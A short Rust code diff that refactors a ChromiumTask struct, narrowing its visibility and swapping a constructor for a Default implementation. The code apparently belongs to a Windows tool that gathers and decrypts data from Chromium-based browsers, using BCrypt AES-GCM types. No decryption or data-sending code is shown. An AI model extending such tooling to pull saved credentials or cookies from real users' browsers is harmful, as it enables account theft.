@@ -38,12 +38,12 @@ use windows_sys::Win32::Security::Cryptography::{
     BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB,
 };
 
-pub struct ChromiumTask<'a, C: Collector, F: FileSystem> {
+pub(crate) struct ChromiumTask<'a, C: Collector, F: FileSystem> {
     tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask<C, F>)>,
 }
 
-impl<C: Collector, F: FileSystem> ChromiumTask<'_, C, F> {
-    pub(crate) fn new() -> Self {
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for ChromiumTask<'_, C, F> {
+    fn default() -> Self {
         let all_browsers = get_chromium_browsers();
         let mut tasks = vec![];
 
